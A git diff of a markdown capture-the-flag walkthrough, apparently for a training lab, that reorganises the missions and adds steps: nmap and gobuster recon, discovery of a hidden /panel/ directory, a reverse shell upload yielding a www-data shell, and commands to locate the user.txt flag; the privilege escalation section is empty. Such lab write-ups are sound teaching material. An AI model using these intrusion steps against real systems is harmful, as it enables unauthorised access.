@@ -1,9 +1,9 @@
 ## Target info
 10.10.182.156
 
-## Mission
-Root the target!!!
-
+## Missions
+- Root the target and find a flag in user.txt
+- Escalate privileges and find a flag in root.txt 
 
 ## Performance
 ### Recon
@@ -33,11 +33,7 @@ Root the target!!!
     Nmap done: 1 IP address (1 host up) scanned in 8.02 seconds
     root@ip-10-10-91-11:~# 
 
-Some helpful info: 
-- 2 open ports
-- Version of Apache: 2.4.29
-- ssh
-
+###  Root the target and find a flag in user.txt
 Find directories on the web server using the GoBuster tool and discover the hidden directory
 
     root@ip-10-10-91-11:~# gobuster dir -u http://10.10.182.156 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,sh,txt,cgo,html,js,css,py
@@ -66,8 +62,6 @@ Find directories on the web server using the GoBuster tool and discover the hidd
 
 The hidden directory is /panel/
 
-### Get a shell and find the flag
-
 Reverse shell 🐚 Upload
 
 1. **Generate Reverse Shell**
@@ -94,6 +88,17 @@ Reverse shell 🐚 Upload
         uid=33(www-data) gid=33(www-data) groups=33(www-data)
         /bin/sh: 0: can't access tty; job control turned off
         $
+   
+Find the flag in user.txt
+        $ find file ./* | grep "user.txt"
+        ...
+        ./var/www/user.txt
+        $ cat ./var/www/user.txt
+        
+The result of the cat command will show the flag!
 
-(to be continued)
+### Escalate privileges and find a flag in root.txt
+
+
+
 
